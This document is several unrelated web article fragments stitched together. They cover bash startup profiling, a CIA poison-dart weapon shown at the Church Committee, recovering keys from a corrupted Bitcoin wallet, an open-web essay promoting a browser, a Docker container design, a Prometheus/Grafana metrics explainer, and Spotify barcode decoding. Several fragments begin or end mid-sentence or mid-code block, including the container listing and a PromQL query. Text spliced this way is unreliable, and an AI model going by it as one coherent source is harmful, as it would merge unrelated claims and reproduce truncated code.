<p>But that’s it. No other single command stands out, it’s just a lot of small
things that add up. Daniel says “it has to take <em>some</em> time,” and he’s mostly
right, but I still have one trick up my sleeve.</p>

<p>My <code>.bashrc</code> is split into several smaller parts in <code>~/.bashrc.d</code>, so I can
profile these and see if anything stands out. My
<a href="https://github.com/liskin/dotfiles/blob/68964611b4b578b646cf5f13a47a4ee77e93e740/.bashrc"><code>.bashrc</code></a>
thus becomes:</p>

<div><div><pre><code><span>for </span>i <span>in</span> ~/.bashrc.d/<span>*</span>.sh<span>;</span> <span>do
	if</span> <span>[[</span> <span>$__bashrc_bench</span> <span>]]</span><span>;</span> <span>then
		</span><span>TIMEFORMAT</span><span>=</span><span>"</span><span>$i</span><span>: %R"</span>
		<span>time</span> <span>.</span> <span>"</span><span>$i</span><span>"</span>
		<span>unset </span>TIMEFORMAT
	<span>else</span>
		<span>.</span> <span>"</span><span>$i</span><span>"</span>
	<span>fi
done</span><span>;</span> <span>unset </span>i
</code></pre></div></div>

<p>Let’s see what happens…</p>

<div><div><pre><code>[tomi@notes ~]$ __bashrc_bench=1 bash -i
/home/tomi/.bashrc.d/10_env.sh: 0,118
/home/tomi/.bashrc.d/20_history.sh: 0,000

/home/tomi/.bashrc.d/90_fzf.sh: 0,011
</code></pre></div></div>

<p>118&nbsp;ms in <code>10_env.sh</code> was caused by <code>man -w</code> and we know what to do with that.</p>

<h4 id="completions">completions</h4>

<p>11&nbsp;ms in <code>31_​completion.sh</code> which loads <a href="https://github.com/scop/bash-completion">bash-completion</a>. That’s
certainly better than Daniel’s 235&nbsp;ms, probably because up-to-date
bash-completion only loads a few necessary completions and defers everything
else to being loaded on demand. I couldn’t live without the completions, so
11&nbsp;ms is a fair price.</p>

<p>8&nbsp;ms for <code>50_​git_​dotfiles.sh</code>, which defines a few aliases and
sets up git completions for my <code>git-dotfiles</code> alias, seems too much, though.
Good news is that we don’t need to drop this. We can use bash-completion’s
on-demand loading. Whenever completions for command <code>cmd</code> are needed for the
first time, bash-completion looks for
<code>~/.local/​share/​bash-completion/​completions/​cmd</code> or
<code>/usr/​share/​bash-completion/​completions/​cmd</code>.</p>

<p>Therefore,
<a href="https://github.com/liskin/dotfiles/blob/68964611b4b578b646cf5f13a47a4ee77e93e740/.local/share/bash-completion/completions/git-dotfiles"><code>~/.local/​share/​bash-completion/​completions/​git-dotfiles</code></a>
becomes:</p>

<div><div><pre><code>. /usr/share/bash-completion/completions/git
complete -F _git git-dotfiles
</code></pre></div></div>

<h4 id="fzf">fzf</h4>

<p><code>90_fzf.sh</code> loads key bindings and completions code so that <a href="https://github.com/junegunn/fzf">fzf</a> is used
when searching through history, completing <code>**</code> in filenames, etc. Well worth
the 11&nbsp;ms it needs to load<sup id="fnref:fzf" role="doc-noteref"><a href="#fn:fzf">2</a></sup>.</p>

<h4 id="are-we-done-yet">are we done yet?</h4>

<p>After these changes, I got:</p>

<div><div><pre><code>[tomi@notes ~]$ __bashrc_bench=1 bash -i
/home/tomi/.bashrc.d/10_env.sh: 0,001
/home/tomi/.bashrc.d/20_history.sh: 0,000

/home/tomi/.bashrc.d/90_fzf.sh: 0,011
</code></pre></div></div>

<p>That’s 29&nbsp;ms, brilliant! Or… is it? <emoji>🤔</emoji></p>

<div><div><pre><code>[tomi@notes ~]$ hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean ± σ):      55.7 ms ±   1.0 ms    [User: 47.6 ms, System: 11.1 ms]
  Range (min … max):    54.8 ms …  58.9 ms    53 runs
</code></pre></div></div>

<h4 id="history">history</h4>

<p>Some of those additional 26&nbsp;ms are spent reading my huge
(<code>HISTSIZE=​50000</code>) <code>.bash_​history</code> file. I will skip the details
about how I investigated this, because I didn’t: I stumbled upon this by
chance while testing something else.</p>

<p>We can see that using an empty history file brings us down to a little under
40&nbsp;ms:</p>

<div><div><pre><code>[tomi@notes ~]$ HISTFILE=/tmp/.bash_history_tmp hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean ± σ):      38.6 ms ±   0.7 ms    [User: 34.0 ms, System: 7.8 ms]
  Range (min … max):    37.8 ms …  42.3 ms    75 runs
</code></pre></div></div>

<p>Now, cutting 17&nbsp;ms by sacrificing the shell history is probably not a good
deal for most people. I settled for setting up a systemd
<a href="https://github.com/liskin/dotfiles/blob/f978be7424946afebe56dbe5ecc85c9f36d1e057/.config/systemd/user/liskin-backup-bash-history.timer">timer</a>
to <a href="https://github.com/liskin/dotfiles/blob/f978be7424946afebe56dbe5ecc85c9f36d1e057/bin/liskin-backup-bash-history">back up
<code>.bash_​history</code></a>
to git once a day and lowered <code>HISTSIZE</code> to 5000<sup id="fnref:history" role="doc-noteref"><a href="#fn:history">3</a></sup>. This still keeps
my bash startup below 40&nbsp;ms:</p>

<div><div><pre><code>[tomi@notes ~]$ hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean ± σ):      39.9 ms ±   0.5 ms    [User: 36.1 ms, System: 6.8 ms]
  Range (min … max):    39.1 ms …  42.1 ms    73 runs
</code></pre></div></div>

<h3 id="conclusion">Conclusion</h3>

<p>By dropping unnecessary invocation of <code>man -w</code>, deferring loading of git
completions to when they’re needed, and shortening my shell history file, I
managed to speed up bash startup from 165 ms to 40 ms.</p>

<div><div><pre><code>Benchmark #1: bash -i
  Time (mean ± σ):     165.8 ms ±   0.7 ms    [User: 156.3 ms, System: 12.8 ms]
  Range (min … max):   164.9 ms … 167.1 ms    17 runs
</code></pre></div></div>

<div><div><pre><code>Benchmark #1: bash -i
  Time (mean ± σ):      39.9 ms ±   0.5 ms    [User: 36.1 ms, System: 6.8 ms]
  Range (min … max):    39.1 ms …  42.1 ms    73 runs
</code></pre></div></div>

<p>More importantly, I no longer type before the prompt, even if I try!</p>

<p><img src="https://work.lisk.in/img/even-faster-bash-startup/corrtype.png" alt="not messed up prompt"></p>

<p>And at this point I can finally agree with Daniel that further tweaking will
only have diminishing returns<sup id="fnref:latency" role="doc-noteref"><a href="#fn:latency">4</a></sup>. <emoji>😊</emoji></p>

Embree’s research led to the development of a top-secret weapon known as the “heart-attack gun.”</p><p>It involved the freezing of shellfish toxin mixed with water to form a frozen dart which would then be fired from the heart-attack gun. Once inside the body, the poison would then dissolve into the person’s bloodstream and cause a heart attack.</p><p>In 1975 CIA Director William Colby presented the weapon at a Church Committee hearing, chaired by Senator Frank Church. The heart attack gun was a handgun with a sight affixed to the top, had a battery in the handle, and used electricity to fire a dart.</p><p>Colby told the committee that the weapon was capable of firing a dart which could enter the body “without perception.” The only way of knowing that the person had been shot by the weapon, was the presence of a tiny red dot at the point of entry. Colby also claimed that the poison would not show up in the autopsy. The official cause of death would, therefore, be deemed a heart attack. The weapon was developed in order to allow the CIA to commit assassinations that could never be traced back to them.</p><p id="loadergif"><img width="100" height="100"

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>A friend of a relative had brought in their Macbook Air, and kindly asked me to repair it.
This required me to download the latest MacOS for which I didn’t have enough space for.
In a desperate attempt, I decided to clean up my external hard drive, removing files that were taking up too much storage.</p>

<p>This is the exact moment that karma had found its way to my 4 AM adventure to fix this MacBook.</p>

<p>To my surprise I found a folder named “Btc”, where I stored episode of television shows. 
Apparently it has been there since 2015 - this must have been my very first wallet!</p>

<p>Sadly, the wallet wouldn’t open in bitcoin core, it has been corrupted.
The <code>db.log</code> outputs the logs for the BerkeleyDB wallet file, it indicated the following error message:</p>
<pre><code>file wallet.dat has LSN 780/2077553, past end of log at 1/333
Commonly caused by moving a database from one database environment
to another without clearing the database LSNs, or by removing all of
the log files from a database environment
DB_ENV-&gt;log_flush: LSN of 780/2077553 past current end-of-log of 1/333
Database environment corrupt; the wrong log files may have been removed or incompatible database files imported from another environment
</code></pre>

<p>Therefore I was forced to salvage the wallet somehow.
The <code>Bitcoin Core</code> software has an option <code>-salvagewallet</code> which did not appear to help.</p>

<p>A bit of googling around and I found out that uncompressed private keys are prepended with <code>01 01 04 20</code>.
Time to take a quick scroll through the file in <code>HxD</code>, a popular hex editor!</p>

<p><img src="https://kewde.github.io/res/corrupted-bitcoin-wallet/HxD-search.png" alt=""></p>

<p><img src="https://kewde.github.io/res/corrupted-bitcoin-wallet/HxD-search-2.png" alt=""></p>

<p>I didn’t expect to get 145 hits, but what I certainly didn’t want to do was manually converting all of those hits to private keys and checking the balance.</p>

<p><img src="https://kewde.github.io/res/corrupted-bitcoin-wallet/HxD-search-3.png" alt=""></p>

<p>The private key is 32 bytes long and is just after our prefix.</p>
<pre><code>ffb2b2ed484fa1d5c9b2f4ad8e7ec696
</code></pre>

<p>So I got to work, the result is below.</p>


<pre><code>pip install bit
</code></pre>

<p>Take the code below and put in a file named <code>salvage.py</code>
<strong>Do not forget to uncomment and change the address variable on line 7</strong>.</p>

<p>Finally, run the script!</p>
<pre><code>python salvage.py
</code></pre>

<p>It will output something like this, and if it finds funds, will automatically transfer them over to the address your specified.
PS: do not post this publicly, the first string is the <code>private key</code>, followed by the <code>address</code> and finally the <code>amount of btc</code>.</p>

<p>In retrospect, I could’ve used PyWallet but I decided not to.</p>

<h2 id="stricter-validation">Stricter validation</h2>
<p>The PyWallet implementation does a lot more checks before it decides that a key is “valid”.
It seems to be using a concept of both “prefixes” and “suffixes” for the keys.
Additionally the prefix used in <code>PyWallet</code> is a lot larger, <code>308201130201010420</code> instead of <code>01010420</code>.
If by any chance a single character of the prefix and/or suffix get corrupted, it will not detect it as a key.
My approach is more aggressive in the sense that it will attempt anything that might look like a key.</p>

<h2 id="unencrypted-wallet">Unencrypted wallet</h2>
<p>Additionally, my wallet was not encrypted, therefore it was a bit overkill to use PyWallet.</p>

<h2 id="the-real-reason">The real reason</h2>
<p>I was ony my Windows machine and I didn’t feel like spending an hour to install dependencies like <code>python-twisted</code>, when I could get the job done with less code.</p>

<p>Nonetheless, PyWallet is a great tool and it is worth using for encrypted wallets.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p><em>Part 1: How your user experience changes for the worse as the open web gives way to walled gardens</em></p><p>I hang out in two circles. Open web enthusiasts that are lamenting its demise, and regular users who are happy with their fast snappy apps and couldn't care less. </p><p>These groups have a hard time talking because the "open web" too often comes across as an idealistic abstract notion and most end users just don't tangibly feel the bad consequences. In fact, they're often happier with the snappy, vertically integrated experience of closed app ecosystems. </p><p>My goal here is to make it more palpable how everyday apps, searches and tools get worse when we let big centralized companies take over the web, and explore some paths for reversing it.</p><h2>What is the the open web?</h2><p>Most definitions of the "open web" I've seen are either too technical to be accessible or too abstract to be usable and getting gridlocked in this debate often means watching from the sidelines while actual user welfare slowly diminishes.</p><p>Three characteristics that proponents of the open web will agree to in roughly descending order are:</p><ul><li><strong>Ease of publishing</strong>: anyone can publish to it freely or at least very cheaply, and is on the same footing with a globally accessible URL</li><li><strong>Ease of consuming</strong>: Net neutrality — ISP's dont cut deals with corporations to make some websites load faster or cheaper than others.</li><li><strong>Ease of remixing</strong>. You can see the source code. Content licenses and tools are permissive for derived works.</li></ul><h2>Detour: A framework to break down how people use the web</h2><p>I want to focus on the user experience point of view. To do this, I'm going to introduce a framework that divides up all our internet usage into two categories.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/xscGdbWOOPkGjdER.png" alt="Frame 1.png"></p><h3><strong>Unfamiliar problems</strong></h3><p>You have an unfamiliar problem and to solve it you either need to learn something new, or purchase goods or services to solve it</p><ul><li>e.g. taking out a mortgage, a health problem in the family, where to go to college, what skill to acquire next.</li><li>Unfamiliar problems are solved in large part with acquiring new knowledge, not just products or services.</li><li>These user journeys start with search engines — Google predominantly and **a lot of the time solving them is spent on web pages**.</li><li>When people are looking to solve unfamiliar problems, **revenue is typically higher-margin**, because users can't price the products and services as well.</li><li>These ultimately transition to being familiar problems.</li></ul><h3><strong>Familiar problems</strong></h3><ul><li>e.g. being entertained, keeping the dog food in stock,</li><li>These are best solved with apps like Email, Netflix, Twitter, DTC subscription boxes, etc.</li><li>Solving these needs has a very well defined user interaction journey. You open the app you're familiar with and follow its standard flow.</li><li>Revenue from people solving familiar problems is typically lower-margin and there's more competing products.
</li></ul><h3>How we're spending our time on familiar vs. unfamiliar problems</h3><p>Using time spent in apps vs mobile web on mobile is a way to proxy how we divide up our time.<strong> We spend most of our time on familiar problems but have a constant trickle of unfamiliar problems</strong>.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/cPuXkKFELALeIAkI.png" alt="Untitled (1).png"></p><h2>Unfamiliar problems are better solved with the open web</h2><p>Think about the last time you did some research, e.g. choosing a phone plan. You asked your friends, compared on forums, looked at the official sites, scribbled some notes and made a decision. Even if this journey was quick, you likely traversed a dozen services and products to do this.</p><p>Unfamiliar problems have less constraints, require creativity to solve, and thus are better suited to open solutions. Some other things that work for the open web here</p><ul><li>comparing alternatives is easier.</li><li>changing modalities (e.g. from reading to video) is easier.</li></ul><h2>Familiar problems stand to benefit more from tight vertical integration</h2><p>Take Spotify for example. It solves the very familiar problem of listening to music. Spotify just works better as an app because</p><ul><li>Controlling the user experience end to end makes for smoother flows.</li><li>Having all the user data kept with Spotify allows for better recommendation algorithms.</li><li>Spotify can easily hand off between devices.</li><li>It can run in the background</li></ul><p>Sure, the web can do a bunch of these things, but they're simply not first-class considerations in the open-read-close workflow that the browser was designed for.</p><h2>But the open web can be better for familiar problems too, especially for breaking monopolies</h2><p>Let's look at Amazon. Initially you start buying there because of their "always low prices" and the convenience of 2 day shipping. Over the years you keep shopping there, until you've forgotten that </p><ol><li>free 2 day shipping is now near universal</li><li>amazon isn't often the cheapest place</li></ol><p>On the Amazon app, you see the story around the product that best serves Amazon, not the buyer. Meanwhile, over on Insight you can use the web version and do all these things the app can't.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/ZEblynrLvBsutnlQ.png" alt="Screen Shot 2020-11-17 at 5.42.21 PM.png"></p><p>... and not just that

</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/JVZoTRazmYPZXBQQ.png" alt="Screen Shot 2020-11-17 at 5.59.22 PM.png"></p><h2><strong>How solving unfamiliar problems gets harder too</strong></h2><p>Unfamiliar problems are solved in large part with acquiring new knowledge, not just products or services. The incentives to freely create knowledge that solves unfamiliar problems is lost as the web closes down.</p><ul><li>Google increasingly takes a larger percent of ad revenue as they <a href="https://sparktoro.com/blog/less-than-half-of-google-searches-now-result-in-a-click/">start extracting answers from pages and showing them on their search result pages.</a><a href="https://sparktoro.com/blog/less-than-half-of-google-searches-now-result-in-a-click/"></a></li><li><a href="https://sparktoro.com/blog/less-than-half-of-google-searches-now-result-in-a-click/"></a>Publishers have to either a) paywall their content (e.g. NYTimes) or b) subtly sell products (everyone standing a Wirecutter alternative), or c) ask for donations in order to survive.</li><li>Only a few big name publishers survive. Google and Facebook start sending them more of the traffic that's left, and since domain rank plays a big part in Google's ranking, those that survived assimilate more power and rank better.</li><li>and search engines seem more littered with SEO junk and less actually useful information year over year.</li></ul><h2>In conclusion, and where we fit in.</h2><p>And that's how your user experience slowly degrades, and that's why we stand to suffer as users if we give up the ability to remix software that the web brought us and closed apps are now taking away. </p><p>Our goal with Insight is to give the web (in particular on mobile) a fighting chance by exhibiting how it can be more powerful than a closed ecosystem and give more control to the end-user. We do this by showcasing the web's infinite extensibility and customizability for common use cases like <a href="http://insightbrowser.com/collections/search">search</a>, <a href="https://insightbrowser.com/collections/shopping">shopping</a>, <a href="https://insightbrowser.com/collections/reading">reading</a> and <a href="https://insightbrowser.com/collections/cooking">cooking</a>.</p><p>Insight's advanced features will soon only be available to Pro subscription users but for a limited time we're opening up <strong>lifetime free beta access if you download it via TestFlight below.</strong></p><h3>Coming up in part 2</h3><ul><li>What parts of the open web probably should die off?</li><li>A pragmatic path for what's left of the open web to thrive again.</li></ul><p>We'd love to hear from you, feel free to tweet at or DM us at @<a href="https://twitter.com/insightbrowser">insightbrowser</a> </p></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When we started our journey to build Keyper, we were clear from the beginning that we’d bundle keyper as a container. As we progressed with its development, we looked into various container designs. Before this, our experience with building containers was playing with a toy variety and primarily with Docker. Some containerized applications we evaluated were large (over 1GB) and had, in some cases, multiple containers. We aimed to keep the design of the Keyper container simple and its size smaller than 100MB. And, we also wanted Keyper
<a href="https://12factor.net/" target="_blank" rel="noopener">Twelve-Factor App</a> compliant.</p><p>Although Linux was a natural choice as a base OS for the container, it took us a while to find the right Linux Distro. Most Linux distribution assumes that it is running on real hardware or a virtualized hardware and not in a container such as Docker. Some distros have a complex init system that is not suitable for a Container. We did not want to treat our Container as VM.</p><p>When we looked around, we found many distros that could fit our bill but were bigger than the size threshold of 100MB (e.g. Ubuntu, CentOS). And, the package repository of some of the smaller distros was not that complete (e.g. many busybox based images). Researching further, we found that Alpine Linux to be a popular base OS for Docker application. The reason is its tiny base image size (5 MB) and completeness of its repository and toolset. Based on this, we decided to use Alpine as a base for Keyper.</p><p>Here is what we found when compared image sizes for various distros.</p><table><thead><tr><th>Image</th><th>Size</th></tr></thead><tbody><tr><td>Ubuntu</td><td>72MB</td></tr><tr><td>CentOS</td><td>215MB</td></tr><tr><td>Debian</td><td>114MB</td></tr><tr><td>Alpine</td><td>5MB</td></tr></tbody></table><p>Once we settled on the Alpine Linux, we started to think about its tooling. We did not want to use a full-fledged init system like Upstart or Systemd. While working with an OpenLDAP container, we found its service model to be pretty elegant. When we dug deeper, we found
<a href="https://github.com/osixia/docker-light-baseimage" target="_blank" rel="noopener">docker-light-baseimage</a> as its base. We found two compelling features in this image:</p><ol><li>Simple way to install services and multiple process image stacks. It uses Runit init scheme. The Runit is a cross-platform Unix init scheme with service supervision. It fits perfectly within a docker container framework keeping the size of the container small. Runit features parallelization of the start-up of system services, which can speed up the boot time of the operating system. We found light-weight service supervision a killer feature.</li><li>Getting environment variables from .yaml and .json files.</li></ol><p>The docker-light-baseimage is based on Debian. So, we migrated its toolset to Alpine Linux.</p><p>Let us take a look at its internals.</p><h2 id="image-directory-structure">Image Directory Structure</h2><p>This image uses four directories:</p><ul><li><strong>/container/environment</strong>: for environment files.</li><li><strong>/container/service</strong>: for services to install, setup and run.</li><li><strong>/container/service-available</strong>: for service that may be on demand downloaded, installed, setup and run.</li><li><strong>/container/tool</strong>: for image tools.</li></ul><div><p>As there was no need, we decided ignore <code>/container/service-available</code></p></div><p>This image creates another directory during the run time:</p><ul><li><strong>/container/run</strong>: To store container run environment, state, startup files and process to run based on files in <code>/container/environment</code> and <code>/container/service</code> directories.</li></ul><h2 id="service-directory-structure">Service Directory Structure</h2><p>A service directory contains shell scripts, with each shell script having a specific purpose. The service directory is added in <code>/container/service</code> to create a service</p><ul><li><strong>my-service</strong>: root directory</li><li><strong>my-service/install.sh</strong>: install script (not mandatory).</li><li><strong>my-service/startup.sh</strong>: startup script to setup the service when the container start (not mandatory).</li><li><strong>my-service/process.sh</strong>: process to run (not mandatory).</li><li><strong>my-service/finish.sh</strong>: finish script run when the process script exit (not mandatory).</li><li><strong>my-service/…</strong> add whatever you need!</li></ul><p>All container tools are located under the <code>/container/tool</code> directory and are linked in <code>sbin/</code> so they belong to the container PATH.</p><table><thead><tr><th>Filename</th><th>Description</th></tr></thead><tbody><tr><td>run</td><td>The run tool is defined as the image ENTRYPOINT (see
<a href="https://github.com/dbsentry/keyper-docker/blob/master/Dockerfile" target="_blank" rel="noopener">Dockerfile</a>). It set the environment and run startup scripts and images process. More information in the
<a href="https://github.com/osixia/docker-light-baseimage#run" target="_blank" rel="noopener">Advanced User Guide</a>.</td></tr><tr><td>setuser</td><td>A tool for running a command as another user. Easier to use than su, has a smaller attack vector than sudo, and unlike chpst this tool sets $HOME correctly.</td></tr><tr><td>log-helper</td><td>A simple bash tool to print message base on the log level.</td></tr><tr><td>add-service-available</td><td>A tool to download and add services in service-available directory to the regular service directory.</td></tr><tr><td>add-multiple-process-stack</td><td>A tool to add the multiple process stack: runit, cron syslog-ng-core, and logrotate.</td></tr><tr><td>install-service</td><td>A tool that execute /container/service/install.sh and /container/service/*/install.sh scripts.</td></tr><tr><td>complex-bash-env</td><td>A tool to iterate through complex bash environment variables created by the run tool when a table or a list was set in environment files or environment command-line argument.</td></tr></tbody></table><h2 id="keyper-container-design">Keyper Container Design</h2><p>Based on what we learned from the docker-light-baseimage, let us look at how we adapted this in the Keyper container design:</p><pre><code>keyper-docker

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3 id="open-source-metrics-stack">Open Source Metrics Stack</h3><p>Metrics are a critical aspect of any system to understand its health and operational state. Design of any system requires collection, storage and reporting of metrics to provide a pulse of the system. We explore how tsdb, prometheus and grafana form that stack for open source metrics reporting in Kubernetes.</p><p>Data is stored over a series of time intervals and needs an efficient database to store and retrieve this data.</p><p><span><a href="http://opentsdb.net/overview.html">OpenTSDB Time Series Database</a></span> is one such time series database that can serve that need.</p><p>While data is stored in a time series database, an standard system to scrape such metrics and store it in the database has emerged in form of <a href="https://prometheus.io/">Prometheus </a>. When a data source exports metrics in <a href="https://prometheus.io/docs/instrumenting/exposition_formats/">prometheus exposition format</a>, it can be scraped by prometheus. While time series database stores metrics, Prometheus collects the metrics and pushes them in the database.</p><p>Any database also needs an efficient and programmer friendy way to query information, eg: SQL for popular transactional databases like Postgres and MySQL. Prometheus defines a rich query language in form of PromQL to query data from this time series database.</p><p>Any form of reporting solution isn’t complete without a graphical component to plot data in graphs, bar charts, pie charts, time series and other mechanisms to visualize data. Grafana serves this need where it can take a data source (like Prometheus) and provides the programmability and flexibility to display data in a form that is useful to the user.</p><p>We broadly cover how the different systems work in tandem, what makes them stick together, some detail of each sub-system and tracing a variable from end-to-end to gain a clear understanding.</p><p>Enroute is built using Envoy proxy and both sub-systems provide a prometheus endpoint to scrape/export the operational metrics in the system.</p><h3 id="discovery-storage-and-querying-of-metrics-data">Discovery, Storage and Querying of Metrics Data</h3><p>This section describes how prometheus uses service discovery to scrape data and store it in TSDB. We then describe how Grafana uses PromQL to query this data.</p><h5 id="finding-instances-to-scrape-using-service-discovery">Finding Instances to Scrape using Service Discovery</h5><p>Prometheus needs a port and path to scrape data from. How does it find that? This problem is addressed by Prometheus service discovery.</p><p>You can set the instance port and path to scrape in a prometheus config file. With dynamic environments like kubernetes where containers, endpoints, pods, services, ip-addresses are transient, a static configuration won’t work. A more dynamic approach is using service discovery and providing instructions about how to work with discovered services. This is where prometheus service discovery can be configured to discover instances (or job which is a collection of instances).</p><p>Prometheus service discovery supports several environments like Kubernetes, Azure, Digital Ocean and several other options. A complete set of service discovery options can be found on <a href="https://prometheus.io/docs/prometheus/latest/configuration/configuration/">prometheus configuration reference </a>. The <code>&lt;*_sd_config&gt;</code> are all different environments in which prometheus has built-in support and can be configured for service discovery.</p><p>Service discovery returns a list of instances to scrape metrics from. The discovery process may also discover additional metadata about the discovered instances. This additional metatdata may be used by the user to ignore, filter, customize or to<a href="https://github.com/prometheus/prometheus/tree/master/discovery"> add attributes to the collected data</a>. Prometheus uses a <a href="https://prometheus.io/docs/prometheus/latest/configuration/configuration/#relabel_config">relablelling</a> mechanism to achieve that.</p><figure><img height="450" src="https://d33wubrfki0l68.cloudfront.net/9e278a0e4469b28dd26f14efcf4181d65b6fdf20/905e4/img/prometheus-discovery.png" alt="prometheus grafana discovery" width="900"></figure><p>In the example above from <a href="https://github.com/prometheus/prometheus/blob/v2.22.0-rc.0/documentation/examples/prometheus-kubernetes.yml">prometheus github </a>, the configuration file for prometheus specifies kubernetes service discovery using <code>kubernetes_sd_config</code> directive. Note how relabelling can be used to ignore certain instances and replace variable names.</p><p>Prometheus also shows the list of targets that it has discovered on the <code>/targets</code> endpoint</p><figure><img height="350" src="https://d33wubrfki0l68.cloudfront.net/7a2213180bf93362518d534cf44fbb0d3c481b12/0b4bc/img/prometheus-discovery-targets.png" alt="prometheus grafana discovery targets" width="650"></figure><h5 id="reporting-of-variables">Reporting of variables</h5><p>The first requirement for the system to work is how variable state or metric is reported. When a system that has metric to report, it is broadly classified as the type of data which is either a counter that monotonically increases or a gauge that can increase or decrease over time.</p><p>Such a distinction at the source of where the metric is generated is required to facilitate the metric stack to correctly query, store and retrieve data.</p><p>Prometheus has several libraries in different languages that help facilitate defining the variable type, operating on it and exporting it.</p><h5 id="scraping-and-storage-of-variables">Scraping and storage of variables</h5><p>OpenTSDB supports a multi-dimensonal data model where a data point can be identified using a name and key/value pairs. As an example, let us consider the data model with an example.</p><p>When a request traverses through Envoy, it is proxied and connects to an upstream to serve the request. One such variable for upstream stats is <code>envoy_cluster_upstream_rq</code>.</p><p>The figure below shows <a href="https://prometheus.io/docs/instrumenting/exposition_formats/">prometheus exposition format</a> that is used as an export format for the metric flows over the wire:</p><figure><img height="400" src="https://d33wubrfki0l68.cloudfront.net/ce9d0ca14ff136db29d7d013c838fc0c7de90507/b613f/img/prometheus-scrape.png" alt="prometheus grafana scrape" width="1000"></figure><p>We can <code>GET</code> the information about this variable in Envoy from <code>/stats/prometheus</code> url of <a href="https://www.envoyproxy.io/docs/envoy/latest/operations/admin#get--stats-prometheus">envoy stats</a> endpoint:</p><div><pre><code data-lang="shell"><span> 1</span>$ curl -s localhost:9001/stats/prometheus <span>|</span> grep envoy_cluster_upstream_rq

These key/value pairs facilitate querying of data. The following are all valid queries -</p><ul><li>get a total count of upstream requests where response code is 200.</li><li>get value of all upstream requests for cluster hello-enroute_9091 where reponse code is 429 (rate-limited)</li></ul><h5 id="querying-of-variables">Querying of variables</h5><p>Next we look at how data can be queried once it is stored in TSDB. Querying is how a tool like Grafana pulls data from Prometheus/TSDB</p><figure><img height="300" src="https://d33wubrfki0l68.cloudfront.net/bf35e188bb291182e10be04b5ed7374527109a2f/9dc8b/img/prometheus-q.png" alt="prometheus grafana query" width="400"></figure><p>Note that data variables hold not only time-series value but also an associated key/value. These attributes can be used for querying (eg: <code>envoy_response_code</code> key). This querying is what makes it powerful. There are several ways to look at the same data. While envoy instance from which data was scraped may report a couple of dimensions (or additional key/value tags), additional tags may be added by Prometheus. For instance Prometheus adds kubernetes metadata like service (eg: <code>service</code> key), namespace (eg: <code>kubernetes_namespace</code> key), pod-name, endpoint info etc. when it scrapes and stores information from an instance. All this additional tags can be used to query the data.</p><p>The query language to support rich set of use-cases is critical, and PromQL provides that flexibility. We quickly take a look at how to use PromQL to form queries. More details about PromQL can be found on the prometheus <a href="https://prometheus.io/docs/prometheus/latest/querying/basics/">PromQL</a></p><p>Going back to the original variable <code>envoy_cluster_upstream_rq</code>, it counts the number of upstream requests for clusters. Here are several ways to get this counter:</p><h6 id="query-span-stylecolorgreenfor-service-enroutespan">Query <span>for service enroute</span></h6><div><pre><code data-lang="shell">envoy_cluster_upstream_rq<span>{</span>

Different pieces of media (artists, albums, songs, playlists, users) all have a URI.</p><p>The ABBA song “Take a Chance on Me” has this URI:</p><p><code>spotify:track:6vQN2a9QSgWcm74KEZYfDL</code>.</p><p>The ABBA Album “The Album” has the following URI:</p><p><code>spotify:album:5GwbPSgiTECzQiE6u7s0ZN</code></p><p>As you can see, the URIs can be broken up into components:</p><p><code>spotify:&lt;media type&gt;:&lt;22 characters&gt;</code>.</p><p>The 22 characters are the numbers 0-9, characters a-z and A-Z. This means there are <code>10 + 26 + 26 = 62</code> possibilities for each character (almost <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>).

I suspect setting the first and last bar set to 0 is an aesthetic choice: it makes the barcode look more like a sound wave.

This media reference is 37 bits long and is the key that links a barcode to a given URI. The media reference may just be the hash of an incrementing index. After extracting a media reference from a barcode, you check with Spotify’s database (a look-up table) to determine what URI it corresponds to.

This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a “noisy” communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents don’t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: it’s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I won’t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a 